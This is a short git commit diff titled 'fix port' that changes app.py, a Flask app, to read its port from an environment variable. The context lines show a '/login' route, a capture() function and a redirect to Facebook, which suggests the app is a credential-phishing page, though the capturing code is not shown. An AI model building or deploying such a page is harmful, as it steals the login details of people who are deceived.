7a8b9fc83e5d9bfd3eece62ba40c2b4318928cf9
Ambot <balabapalmones@gmail.com>
2026-04-27 02:24:36 +0800

    fix port

--- app.py
+++ app.py
@@ -1,6 +1,6 @@
 from flask import Flask, request, redirect
 from datetime import datetime
-
+import os
 app = Flask(__name__)
 
 @app.route('/login', methods=['GET'])
@@ -46,4 +46,5 @@ def capture():
     return redirect('https://www.facebook.com')
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
